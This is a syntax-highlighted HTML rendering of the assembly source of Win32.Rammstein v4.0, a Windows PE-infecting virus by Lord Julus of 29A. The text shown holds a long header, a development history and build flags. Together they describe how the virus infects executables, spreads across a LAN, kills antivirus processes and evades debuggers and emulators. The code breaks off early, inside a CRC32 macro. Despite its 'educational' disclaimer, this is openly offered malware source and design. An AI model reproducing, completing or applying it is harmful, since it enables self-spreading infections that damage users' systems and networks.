<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ramm.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
</span><span class="sc1">;                          €€€€€€€€€€€€€€€€€€€€€€€€€€€</span><span class="sc0">
</span><span class="sc1">;                          €€ﬂ     ﬂ€ﬂ     ﬂ€ﬂ     ﬂ€€</span><span class="sc0">
</span><span class="sc1">;                          €€   €   €   €   €   €   €€</span><span class="sc0">
</span><span class="sc1">;                          €€€ﬂﬂﬂ  ‹€‹      €       €€</span><span class="sc0">
</span><span class="sc1">;                          €€   ﬂﬂﬂﬂ€ﬂﬂﬂﬂ   €   €   €€</span><span class="sc0">
</span><span class="sc1">;                          €€       €      ‹€   €   €€</span><span class="sc0">
</span><span class="sc1">;                          €€€€€€€€€€€€€€€€€€€€€€€€€€€</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹       ‹‹‹‹‹‹‹ ‹‹‹‹‹ ‹‹‹ ‹‹‹</span><span class="sc0">
</span><span class="sc1">;      € ‹‹‹ € € ‹‹‹ € € ‹ ‹ € € ‹ ‹ € € ‹‹‹‹€ ‹€ﬂ€‹ € ‹‹‹‹€ €‹ ‹€ € ﬂ€€ €</span><span class="sc0">
</span><span class="sc1">;      € ‹ ‹‹€ € ‹‹‹ € € € € € € € € € €‹‹‹‹ € €‹ ‹€ € ‹‹‹€‹ ‹€ €‹ € €‹ﬂ €</span><span class="sc0">
</span><span class="sc1">;      €‹€‹‹‹€ €‹€ €‹€ €‹€ﬂ€‹€ €‹€ﬂ€‹€ €‹‹‹‹‹€  ﬂﬂﬂ  €‹‹‹‹‹€ €‹‹‹€ €‹€ﬂ€‹€</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                      v4.0</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                               = Final Release =</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                        (c) Lord Julus / 29A (Nov 2000)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      ===================================================================</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                 DISCLAIMER</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      This is the source code of a virus. Possesing, using, spreading of</span><span class="sc0">
</span><span class="sc1">;      this source code, compiling and linking it, possesing, using and</span><span class="sc0">
</span><span class="sc1">;      spreading of the executable form is illegal and it is forbidden.</span><span class="sc0">
</span><span class="sc1">;      Should you do such a thing, the author may not be held responsible</span><span class="sc0">
</span><span class="sc1">;      for any damage that occured from the use of this source code. The</span><span class="sc0">
</span><span class="sc1">;      actual purpose of this source code is for educational purposes and</span><span class="sc0">
</span><span class="sc1">;      as an object of study. This source code comes as is and the author</span><span class="sc0">
</span><span class="sc1">;      cannot be held responsible for the existance of other modified</span><span class="sc0">
</span><span class="sc1">;      variants of this code.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      ====================================================================</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      History:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      09 Sep 2000 - Today I made a small improvement. When the dropper roams</span><span class="sc0">
</span><span class="sc1">;                    the net onto another computer it remains in the windows</span><span class="sc0">
</span><span class="sc1">;                    dir and it represents a weak point which might be noticed</span><span class="sc0">
</span><span class="sc1">;                    by an av. So, now, the virus will smartly remove either</span><span class="sc0">
</span><span class="sc1">;                    the dropper or the entry in the win.ini file if one of</span><span class="sc0">
</span><span class="sc1">;                    them is missing. If both are there, they are left alone</span><span class="sc0">
</span><span class="sc1">;                    because they will remove eachother. Added Pstores.exe to</span><span class="sc0">
</span><span class="sc1">;                    the black list. Thanks to Evul for pointing me out that</span><span class="sc0">
</span><span class="sc1">;                    it is a rather peculiar file and cannot be safely</span><span class="sc0">
</span><span class="sc1">;                    infected.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      22 Jul 2000 - The virus has moved up to version 4.0. Today I added</span><span class="sc0">
</span><span class="sc1">;                    the network infector. It comes in a separate thread.</span><span class="sc0">
</span><span class="sc1">;                    For the moment looks like everything works fine. Will</span><span class="sc0">
</span><span class="sc1">;                    add a timer to it so that it does not hang in huge</span><span class="sc0">
</span><span class="sc1">;                    networks... Virus is above 13k now... Waiting for the</span><span class="sc0">
</span><span class="sc1">;                    LZ!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      18 Jul 2000 - Fixed a bug in the section increase algorithm: if you</span><span class="sc0">
</span><span class="sc1">;                    want to have a good compatibility you NEED to place the</span><span class="sc0">
</span><span class="sc1">;                    viral code exactly at the end of file and NOT at the</span><span class="sc0">
</span><span class="sc1">;                    end of the VirtualSize or SizeOfRawData as it appears</span><span class="sc0">
</span><span class="sc1">;                    in the section header, because many files get their</span><span class="sc0">
</span><span class="sc1">;                    real size calculated at load time in some way.</span><span class="sc0">
</span><span class="sc1">;                    HURRAY!!! YES!! I fixed a shitty bug! If you do section</span><span class="sc0">
</span><span class="sc1">;                    add you MUST check also if any directory VA follows</span><span class="sc0">
</span><span class="sc1">;                    immediately the last section header so that you will</span><span class="sc0">
</span><span class="sc1">;                    not overwrite it. Now almost all files work ok under</span><span class="sc0">
</span><span class="sc1">;                    NT!!!! However, I don't seem to be able to make</span><span class="sc0">
</span><span class="sc1">;                    outlook.exe get infected so I put it on the black list.</span><span class="sc0">
</span><span class="sc1">;                    The other MsOffice executables get infected correctly</span><span class="sc0">
</span><span class="sc1">;                    on both Win9x and WinNT.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      17 Jul 2000 - Have started some optimizations and proceduralizations</span><span class="sc0">
</span><span class="sc1">;                    (;-)))). The virus is quickly going towards 13k so I</span><span class="sc0">
</span><span class="sc1">;                    am quite anxious to implement my new LZ routine to</span><span class="sc0">
</span><span class="sc1">;                    decrease it's size. I fixed a bug: WinNT NEEDS the</span><span class="sc0">
</span><span class="sc1">;                    size of headers value to be aligned to file alignment.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      14 Jul 2000 - Worked heavily on the WindowsNT compatibility. In this</span><span class="sc0">
</span><span class="sc1">;                    way I was able to spot 2 bugs in the infection routine,</span><span class="sc0">
</span><span class="sc1">;                    one regarding RVA of the new section and one regarding</span><span class="sc0">
</span><span class="sc1">;                    the situation when the imports cannot be found by the api</span><span class="sc0">
</span><span class="sc1">;                    hooker. Still thinking if I should rearrange relocs also?</span><span class="sc0">
</span><span class="sc1">;                    Now files are loaded under WindowsNT (NT image is correct)</span><span class="sc0">
</span><span class="sc1">;                    but they cannot fully initialize. Will research some</span><span class="sc0">
</span><span class="sc1">;                    more.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      03 Jun 2000 - Added an encryption layer with no key, just a rol/ror</span><span class="sc0">
</span><span class="sc1">;                    routine on parity. Also added some MMX commands. Fixed</span><span class="sc0">
</span><span class="sc1">;                    a few things.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      22 May 2000 - Added EPO on files that have the viral code outside the</span><span class="sc0">
</span><span class="sc1">;                    code section. Basically from now on the entry point stays</span><span class="sc0">
</span><span class="sc1">;                    only into the code section. The epo is not actually epo,</span><span class="sc0">
</span><span class="sc1">;                    because as I started to code it I decided to make it very</span><span class="sc0">
</span><span class="sc1">;                    complicated so I will include the complicated part in the</span><span class="sc0">
</span><span class="sc1">;                    next release. It will be the so called LJILE32 &lt;Lord</span><span class="sc0">
</span><span class="sc1">;                    Julus' Instruction Length Engine 32&gt;. This engine will</span><span class="sc0">
</span><span class="sc1">;                    allow me to have an exact location of the opcode for each</span><span class="sc0">
</span><span class="sc1">;                    instruction so we will be able to look up any call, jump</span><span class="sc0">
</span><span class="sc1">;                    or conditional jump to place our code call there. So for</span><span class="sc0">
</span><span class="sc1">;                    this version only a jump at the original eip.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      21 May 2000 - Fixed a bug in the api hooker... I forgot that some import</span><span class="sc0">
</span><span class="sc1">;                    sections have a null pointer to names. Also added the</span><span class="sc0">
</span><span class="sc1">;                    infection by last section increase for files who cannot</span><span class="sc0">
</span><span class="sc1">;                    be infected otherwise. All files should be touched now.</span><span class="sc0">
</span><span class="sc1">;                    Also I fixed the problem with the payload window not</span><span class="sc0">
</span><span class="sc1">;                    closing after the process closed. I solved half of it</span><span class="sc0">
</span><span class="sc1">;                    as some files like wordpad.exe still have this problem.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      20 May 2000 - Prizzy helped me a lot by pointing out to me that in</span><span class="sc0">
</span><span class="sc1">;                    order to have the copro working ok I need to save it's</span><span class="sc0">
</span><span class="sc1">;                    environment so that the data of the victim process in</span><span class="sc0">
</span><span class="sc1">;                    not altered. thanx!! Also fixed the cpuid read.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      14 May 2000 - Released first beta version to be tested</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      ====================================================================</span><span class="sc0">
</span><span class="sc1">;      Virus Name ........... Win32.Rammstein</span><span class="sc0">
</span><span class="sc1">;      Virus Version ........ 4.0</span><span class="sc0">
</span><span class="sc1">;      Virus Size ........... 14002 (debug), 15176 (release)</span><span class="sc0">
</span><span class="sc1">;      Virus Author ......... Lord Julus / 29A</span><span class="sc0">
</span><span class="sc1">;      Release Date ......... 30 Nov 2000</span><span class="sc0">
</span><span class="sc1">;      Virus type ........... PE infector</span><span class="sc0">
</span><span class="sc1">;      Target OS ............ Win95, Win98, WinNT, Win2000</span><span class="sc0">
</span><span class="sc1">;      Target Files ......... many PE file types:</span><span class="sc0">
</span><span class="sc1">;                             EXE COM ACM CPL HDI OCX PCI</span><span class="sc0">
</span><span class="sc1">;                             QTC SCR X32 CNV FMT OCM OLB WPC</span><span class="sc0">
</span><span class="sc1">;      Append Method ........ The  virus will check wether there is enough room</span><span class="sc0">
</span><span class="sc1">;                             for  it  inside the code section. If there is not</span><span class="sc0">
</span><span class="sc1">;                             enough  room  the virus will be placed at end. If</span><span class="sc0">
</span><span class="sc1">;                             there  is  it  will  be  inserted inside the code</span><span class="sc0">
</span><span class="sc1">;                             section  at  a  random  offset while the original</span><span class="sc0">
</span><span class="sc1">;                             code will be saved at end. The placing at the end</span><span class="sc0">
</span><span class="sc1">;                             has  also  two  variants.  If the last section is</span><span class="sc0">
</span><span class="sc1">;                             Resources  or Relocations the virus will insert a</span><span class="sc0">
</span><span class="sc1">;                             new section before the last section and place the</span><span class="sc0">
</span><span class="sc1">;                             data  there,  also rearranging the last section's</span><span class="sc0">
</span><span class="sc1">;                             RVAs.  If  the  last section is another section a</span><span class="sc0">
</span><span class="sc1">;                             new  section  will  be placed at end. The name of</span><span class="sc0">
</span><span class="sc1">;                             the new section is a common section name which is</span><span class="sc0">
</span><span class="sc1">;                             choosed  based  on  the existing names so that it</span><span class="sc0">
</span><span class="sc1">;                             does  not  repeat.  If the virus is placed at the</span><span class="sc0">
</span><span class="sc1">;                             end just a small EPO code is used so that the eip</span><span class="sc0">
</span><span class="sc1">;                             stays inside the code section.</span><span class="sc0">
</span><span class="sc1">;                             A  special situation occurs if there is no enough</span><span class="sc0">
</span><span class="sc1">;                             space  to  add  a new section header, for example</span><span class="sc0">
</span><span class="sc1">;                             when  the  code section starts at RVA 200 (end of</span><span class="sc0">
</span><span class="sc1">;                             headers).   In  this  situation  the  virus  will</span><span class="sc0">
</span><span class="sc1">;                             increase the last section in order to append.</span><span class="sc0">
</span><span class="sc1">;      Infect Methods ....... -Direct  file  attacks:  the  virus  will  attack</span><span class="sc0">
</span><span class="sc1">;                             specific  files  in  the windows directory, files</span><span class="sc0">
</span><span class="sc1">;                             which are most used by people</span><span class="sc0">
</span><span class="sc1">;                             -Directory   scan:   all  files  in  the  current</span><span class="sc0">
</span><span class="sc1">;                             directory will be infected, as well as 3 files in</span><span class="sc0">
</span><span class="sc1">;                             the   system  directory  and  3  in  the  windows</span><span class="sc0">
</span><span class="sc1">;                             directory</span><span class="sc0">
</span><span class="sc1">;                             -Api  hooking  (per-process residency): the virus</span><span class="sc0">
</span><span class="sc1">;                             hooks  a  few  api calls and infects files as the</span><span class="sc0">
</span><span class="sc1">;                             victim  uses  the  apis</span><span class="sc0">
</span><span class="sc1">;                             -Intranet  spreading:  the virus spreads into the</span><span class="sc0">
</span><span class="sc1">;                             LAN using only windows apis</span><span class="sc0">
</span><span class="sc1">;      Features ............. Multiple  threads:  the  virus  launches  a  main</span><span class="sc0">
</span><span class="sc1">;                             thread.  While  this thread executes, in the same</span><span class="sc0">
</span><span class="sc1">;                             time,  the original thread returns to host, so no</span><span class="sc0">
</span><span class="sc1">;                             slowing  down  appears.  The  main  viral  thread</span><span class="sc0">
</span><span class="sc1">;                             launches  other  6  threads  and  monitors  their</span><span class="sc0">
</span><span class="sc1">;                             execution.  If  one of the threads is not able to</span><span class="sc0">
</span><span class="sc1">;                             finish  the  system  is  hanged  because it means</span><span class="sc0">
</span><span class="sc1">;                             somebody tryied to patch some of the thread code.</span><span class="sc0">
</span><span class="sc1">;                             Heavy  anti-debugging:  i tried to use almost all</span><span class="sc0">
</span><span class="sc1">;                             the  anti-debug  and  anti-emulation stuff that I</span><span class="sc0">
</span><span class="sc1">;                             know</span><span class="sc0">
</span><span class="sc1">;                             FPU: uses fpu instructions</span><span class="sc0">
</span><span class="sc1">;                             Crc32 search: uses crc32 to avoid waste of space</span><span class="sc0">
</span><span class="sc1">;                             Memory  roaming:  allocates  virtual  memory  and</span><span class="sc0">
</span><span class="sc1">;                             jumps in it</span><span class="sc0">
</span><span class="sc1">;                             Interlaced  code:  this  means  that some threads</span><span class="sc0">
</span><span class="sc1">;                             share  the  same  piece  of code and the virus is</span><span class="sc0">
</span><span class="sc1">;                             careful   to  let  only  one  in  the  same  time</span><span class="sc0">
</span><span class="sc1">;                             otherwise we get some of the variables distroyed.</span><span class="sc0">
</span><span class="sc1">;                             Preety hard to be emulated by avs.</span><span class="sc0">
</span><span class="sc1">;                             Also features semaphores, timers</span><span class="sc0">
</span><span class="sc1">;                             Marks infection using the Pythagoreic numbers.</span><span class="sc0">
</span><span class="sc1">;                             SEH: the virus creates 9 SEH handlers, for each</span><span class="sc0">
</span><span class="sc1">;                             thread and for the main thread.</span><span class="sc0">
</span><span class="sc1">; (*)  Polymorphic .......... Yes (2 engines: Modularis, LJFPE32)</span><span class="sc0">
</span><span class="sc1">; (*)  Metamorphic .......... Yes (mild custom metamorphic engine)</span><span class="sc0">
</span><span class="sc1">;      Encrypted ............ Yes</span><span class="sc0">
</span><span class="sc1">;      Safety ............... Yes (avoids infecting many files)</span><span class="sc0">
</span><span class="sc1">;      Kill AV Processes .... Yes</span><span class="sc0">
</span><span class="sc1">;      Payload .............. On  14th  every  even  month the infected process</span><span class="sc0">
</span><span class="sc1">;                             will  launch  a  thread  that will display random</span><span class="sc0">
</span><span class="sc1">;                             windows  with  some  of  the  Rammstein's lyrics.</span><span class="sc0">
</span><span class="sc1">;                             Pretty  annoying...  Probably  this  is the first</span><span class="sc0">
</span><span class="sc1">;                             virus  that  actually  creates  real  windows and</span><span class="sc0">
</span><span class="sc1">;                             processes  their  messages. The windows shut down</span><span class="sc0">
</span><span class="sc1">;                             as the victim process closes.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      (*) Feature not included in this version.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Debug notes: please note that this source code features many ways of</span><span class="sc0">
</span><span class="sc1">;      debugging. You may turn on and off most of the virus's features by</span><span class="sc0">
</span><span class="sc1">;      turning some variables to TRUE or FALSE.</span><span class="sc0">
</span><span class="sc1">;      ====================================================================</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         $</span><span class="sc0">

</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc2">.586p</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TRUE</span><span class="sc0">                  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DEBUG</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;debug on?</span><span class="sc0">
</span><span class="sc5">ANTIEMU</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;anti-debuggin/emulation?</span><span class="sc0">
</span><span class="sc5">JUMP</span><span class="sc0">                  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;allocate and jump in mem?</span><span class="sc0">
</span><span class="sc5">DIRECT</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;direct action?</span><span class="sc0">
</span><span class="sc5">ANTIAV</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;anti-av feature?</span><span class="sc0">
</span><span class="sc5">APIHOOK</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;hook imported apis?</span><span class="sc0">
</span><span class="sc5">MAINTHREAD</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;launch a main thread?</span><span class="sc0">
</span><span class="sc5">PAYLOAD</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;use payload?</span><span class="sc0">
</span><span class="sc5">RANDOMIZE_ENTRY</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;randomize code sec entry?</span><span class="sc0">
</span><span class="sc5">EPO</span><span class="sc0">                   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;Use EPO</span><span class="sc0">
</span><span class="sc5">MMX</span><span class="sc0">                   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">FALSE</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NETWORKINFECTION</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">VIRUSNOTIFYENTRY</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">FALSE</span><span class="sc0">                </span><span class="sc1">;msgbox at virus start?</span><span class="sc0">
</span><span class="sc5">VIRUSNOTIFYEXIT</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">FALSE</span><span class="sc0">                </span><span class="sc1">;msgbox at virus end?</span><span class="sc0">
</span><span class="sc5">VIRUSNOTIFYHOOK</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">FALSE</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">MAINTHREADSEH</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">THREAD1SEH</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">THREAD2SEH</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">THREAD3SEH</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">THREAD4SEH</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">FALSE</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">THREAD5SEH</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">FALSE</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">THREAD6SEH</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CHECKSUM</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">TRUE</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">WE_ARE_LAST</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RELOCATIONS_LAST</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RESOURCES_LAST</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NOT_AVAILABLE</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AVAILABLE</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">METHOD_MOVE_CODE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">METHOD_APPEND_AT_END</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">METHOD_INCREASE_LAST</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">MMX</span><span class="sc0">                                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mmx.inc</span><span class="sc0">                                    </span><span class="sc1">; MMX !</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@endsz</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">                                       </span><span class="sc1">;locate end of asciiz</span><span class="sc0">
       </span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">nextchar</span><span class="sc0">                              </span><span class="sc1">;string</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">nextchar</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">nextchar</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">endm</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">w32nt_lj.inc</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">w32us_lj.inc</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Credits to jp, vecna, prizzy                     ;calculate crc32</span><span class="sc0">
</span><span class="sc5">mCRC32</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0C1A7F39Ah</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mCRC32_init</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">09C3B248Eh</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">string</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">mCRC32_init</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">irpc</span><span class="sc0">    </span><span class="sc5">_x</span><span class="sc4">,&lt;</span><span class="sc5">string</span><span class="sc4">&gt;</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'&amp;_x&amp;'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc9">rept</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
